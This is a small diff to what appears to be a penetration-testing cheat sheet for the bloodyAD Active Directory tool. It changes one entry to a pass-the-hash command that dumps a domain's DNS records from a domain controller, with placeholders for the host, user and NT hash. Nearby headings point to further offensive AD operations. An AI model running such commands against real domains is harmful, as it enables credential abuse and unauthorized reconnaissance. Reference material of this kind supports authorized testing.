@@ -67,7 +67,7 @@ bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add
 ## add - DNS record (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add  
+bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> get dnsDump --zone <domain> --no-detail  
 ```
 ## add - full control (pth)
 https://github.com/CravateRouge/bloodyAD
